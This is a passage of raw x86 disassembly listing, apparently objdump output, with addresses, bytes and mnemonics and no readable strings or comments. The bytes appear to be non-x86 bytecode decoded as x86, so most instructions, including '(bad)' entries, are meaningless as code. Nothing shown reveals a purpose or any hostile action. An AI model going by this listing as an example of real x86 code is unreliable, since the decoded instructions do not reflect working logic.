  40465d:	33 00                	xor    (%eax),%eax
  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 75                	jb     0x40475f
  4046ea:	23 00                	and    (%eax),%eax
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 8d             	or     -0x73(%edx),%dh
  404744:	23 00                	and    (%eax),%eax
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	ad                   	lods   %ds:(%esi),%eax
  404755:	23 00                	and    (%eax),%eax
  404757:	70 28                	jo     0x404781
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 ad             	es jb  0x40470d
  404760:	23 00                	and    (%eax),%eax
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	ab                   	stos   %eax,%es:(%edi)
  40477c:	20 00                	and    %al,(%eax)
  40477e:	70 28                	jo     0x4047a8
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 ab             	es jb  0x404732
  404787:	20 00                	and    %al,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	b1 23                	mov    $0x23,%cl
  4047af:	00 70 03             	add    %dh,0x3(%eax)
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 23                	jb     0x404808
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 61                	jb     0x404876
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 3b                	jb     0x4048e2
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	4d                   	dec    %ebp
  4048fa:	24 00                	and    $0x0,%al
  4048fc:	70 28                	jo     0x404926
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 75 20 00       	and    $0x207572,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 53                	jb     0x404999
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 69 24 00       	and    $0x246972,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 73 24 00       	and    $0x247372,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 7d 24 00       	and    $0x247d72,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 83             	or     -0x7d(%edx),%dh
  404999:	24 00                	and    $0x0,%al
  40499b:	70 14                	jo     0x4049b1
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 97             	or     -0x69(%edx),%dh
  4049a4:	24 00                	and    $0x0,%al
  4049a6:	70 28                	jo     0x4049d0
  4049a8:	ca 00 00             	lret   $0x0
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 9b             	or     -0x65(%edx),%dh
  4049b6:	24 00                	and    $0x0,%al
  4049b8:	70 72                	jo     0x404a2c
  4049ba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4049bb:	24 00                	and    $0x0,%al
  4049bd:	70 6f                	jo     0x404a2e
  4049bf:	c9                   	leave
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 b1             	or     -0x4f(%edx),%dh
  4049c5:	24 00                	and    $0x0,%al
  4049c7:	70 72                	jo     0x404a3b
  4049c9:	bd 24 00 70 6f       	mov    $0x6f700024,%ebp
  4049ce:	c9                   	leave
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 c9 24 00       	and    $0x24c972,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 d3 24 00       	and    $0x24d372,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 e3 24 00       	and    $0x24e372,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 ef             	or     -0x11(%edx),%dh
  404a25:	24 00                	and    $0x0,%al
  404a27:	70 72                	jo     0x404a9b
  404a29:	e3 24                	jecxz  0x404a4f
  404a2b:	00 70 6f             	add    %dh,0x6f(%eax)
  404a2e:	c9                   	leave
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 f9             	or     -0x7(%edx),%dh
  404a34:	24 00                	and    $0x0,%al
  404a36:	70 72                	jo     0x404aaa
  404a38:	73 24                	jae    0x404a5e
  404a3a:	00 70 6f             	add    %dh,0x6f(%eax)
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 05 25 00       	and    $0x250572,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 9d                	jb     0x4049f0
  404a53:	20 00                	and    %al,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	ab                   	stos   %eax,%es:(%edi)
  404a66:	20 00                	and    %al,(%eax)
  404a68:	70 28                	jo     0x404a92
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 1d 25 00       	and    $0x251d72,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 2f 25 00       	and    $0x252f72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 43 25 00       	and    $0x254372,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 57 25 00       	and    $0x255772,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 61                	jb     0x404b3a
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 61             	adc    %esi,0x61(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 67             	or     0x67(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 93             	or     -0x6d(%edx),%dh
  404b6a:	25 00 70 73 d4       	and    $0xd4737000,%eax
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	0a 0a                	or     (%edx),%cl
  404b73:	73 d5                	jae    0x404b4a
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 d1       	or     $0xd1720907,%eax
  404b92:	25 00 70 6f b5       	and    $0xb56f7000,%eax
  404b97:	00 00                	add    %al,(%eax)
  404b99:	0a 6f 38             	or     0x38(%edi),%ch
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	0a 6f d6             	or     -0x2a(%edi),%ch
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
  404bb8:	07                   	pop    %es
  404bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bba:	d7                   	xlat   %ds:(%ebx)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	0a 2d 09 72 e9 25    	or     0x25e97209,%ch
  404bc3:	00 70 13             	add    %dh,0x13(%eax)
  404bc6:	04 de                	add    $0xde,%al
  404bc8:	28 72 f1             	sub    %dh,-0xf(%edx)
  404bcb:	25 00 70 07 6f       	and    $0x6f077000,%eax
  404bd0:	d8 00                	fadds  (%eax)
  404bd2:	00 0a                	add    %cl,(%edx)
  404bd4:	28 d9                	sub    %bl,%cl
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	0a 13                	or     (%ebx),%dl
  404bda:	04 de                	add    $0xde,%al
  404bdc:	14 06                	adc    $0x6,%al
  404bde:	2c 06                	sub    $0x6,%al
  404be0:	06                   	push   %es
  404be1:	6f                   	outsl  %ds:(%esi),(%dx)
  404be2:	33 00                	xor    (%eax),%eax
  404be4:	00 0a                	add    %cl,(%edx)
  404be6:	dc 26                	fsubl  (%esi)
  404be8:	72 e9                	jb     0x404bd3
  404bea:	25 00 70 13 04       	and    $0x4137000,%eax
  404bef:	de 00                	fiadds (%eax)
  404bf1:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
